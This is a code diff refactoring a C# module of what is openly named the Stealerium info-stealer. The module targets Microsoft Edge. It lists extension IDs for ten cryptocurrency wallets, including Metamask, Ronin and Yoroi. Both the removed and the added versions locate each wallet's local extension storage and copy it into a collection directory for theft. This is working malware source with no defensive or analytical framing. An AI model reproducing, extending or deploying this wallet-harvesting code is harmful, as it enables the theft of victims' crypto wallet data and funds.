@@ -1,129 +1,35 @@
-﻿using System;
-using System.Collections.Generic;
+﻿using System.Collections.Generic;
 using System.IO;
 using Stealerium.Helpers;
+using Stealerium.Target.Browsers;
 
 namespace Stealerium.Target.Browsers.Edge
 {
     internal class Extensions
     {
-        private static readonly List<string[]> EdgeWalletsDirectories = new List<string[]>
+        // Dictionary for storing wallet names and corresponding Edge extension IDs
+        private static readonly Dictionary<string, string> EdgeWalletsDirectories = new Dictionary<string, string>
         {
-            new[]
-            {
-                "Edge_Auvitas",
-                Paths.Lappdata +
-                "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\klfhbdnlcfcaccoakhceodhldjojboga"
-            },
-            new[]
-            {
-                "Edge_Math",
-                Paths.Lappdata +
-                "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\dfeccadlilpndjjohbjdblepmjeahlmm"
-            },
-            new[]
-            {
-                "Edge_Metamask",
-                Paths.Lappdata +
-                "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm"
-            },
-            new[]
-            {
-                "Edge_MTV",
-                Paths.Lappdata +
-                "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\oooiblbdpdlecigodndinbpfopomaegl"
-            },
-            new[]
-            {
-                "Edge_Rabet",
-                Paths.Lappdata +
-                "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\aanjhgiamnacdfnlfnmgehjikagdbafd"
-            },
-            new[]
-            {
-                "Edge_Ronin",
-                Paths.Lappdata +
-                "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\bblmcdckkhkhfhhpfcchlpalebmonecp"
-            },
-            new[]
-            {
-                "Edge_Yoroi",
-                Paths.Lappdata +
-                "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\akoiaibnepcedcplijmiamnaigbepmcb"
-            },
-            new[]
-            {
-                "Edge_Zilpay",
-                Paths.Lappdata +
-                "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\fbekallmnjoeggkefjkbebpineneilec"
-            },
-            new[]
-            {
-                "Edge_Terra_Station",
-                Paths.Lappdata +
-                "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\ajkhoeiiokighlmdnlakpjfoobnjinie"
-            },
-            new[]
-            {
-                "Edge_Jaxx",
-                Paths.Lappdata +
-                "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\dmdimapfghaakeibppbfeokhgoikeoci"
-            }
+            { "Edge_Auvitas", "klfhbdnlcfcaccoakhceodhldjojboga" },
+            { "Edge_Math", "dfeccadlilpndjjohbjdblepmjeahlmm" },
+            { "Edge_Metamask", "ejbalbakoplchlghecdalmeeeajnimhm" },
+            { "Edge_MTV", "oooiblbdpdlecigodndinbpfopomaegl" },
+            { "Edge_Rabet", "aanjhgiamnacdfnlfnmgehjikagdbafd" },
+            { "Edge_Ronin", "bblmcdckkhkhfhhpfcchlpalebmonecp" },
+            { "Edge_Yoroi", "akoiaibnepcedcplijmiamnaigbepmcb" },
+            { "Edge_Zilpay", "fbekallmnjoeggkefjkbebpineneilec" },
+            { "Edge_Terra_Station", "ajkhoeiiokighlmdnlakpjfoobnjinie" },
+            { "Edge_Jaxx", "dmdimapfghaakeibppbfeokhgoikeoci" }
         };
 
-        public static void GetEdgeWallets(string sSaveDir)
+        /// <summary>
+        /// Retrieves Edge wallets and saves them to the specified directory.
+        /// </summary>
+        /// <param name="saveDirectory">The directory where wallets will be saved.</param>
+        public static void GetEdgeWallets(string saveDirectory)
         {
-            try
-            {
-                int walletsCopied = 0;
-
-                foreach (var array in EdgeWalletsDirectories)
-                {
-                    walletsCopied += CopyWalletFromDirectoryTo(sSaveDir, array[1], array[0]) ? 1 : 0;
-                }
-
-                // If no wallets were copied, delete the save directory if it exists
-                if (walletsCopied == 0)
-                {
-                    Filemanager.RecursiveDelete(sSaveDir);
-                    Logging.Log("No wallets found in Edge extensions.");
-                }
-            }
-            catch (Exception)
-            {
-                //
-            }
-        }
-
-        // Copy wallet files to directory
-        private static bool CopyWalletFromDirectoryTo(string saveDirectory, string walletDirectory, string walletName)
-        {
-            try
-            {
-                if (!Directory.Exists(walletDirectory))
-                {
-                    return false;
-                }
-
-                // Create saveDirectory if it doesn't exist
-                if (!Directory.Exists(saveDirectory))
-                {
-                    Directory.CreateDirectory(saveDirectory);
-                }
-
-                var destinationDirectory = Path.Combine(saveDirectory, walletName);
-                Directory.CreateDirectory(destinationDirectory);
-                Filemanager.CopyDirectory(walletDirectory, destinationDirectory);
-                Counter.BrowserWallets++;
-
-                Logging.Log($"Copied wallet: {walletName} to {destinationDirectory}");
-                return true;
-            }
-            catch (Exception ex)
-            {
-                Logging.Log($"Error copying wallet {walletName}: {ex.Message}");
-                return false;
-            }
+            string baseBrowserPath = Path.Combine(Paths.Lappdata, "Microsoft", "Edge", "User Data", "Default", "Local Extension Settings");
+            BrowserWalletExtensionsHelper.GetWallets(saveDirectory, EdgeWalletsDirectories, baseBrowserPath, "Edge");
         }
     }
 }
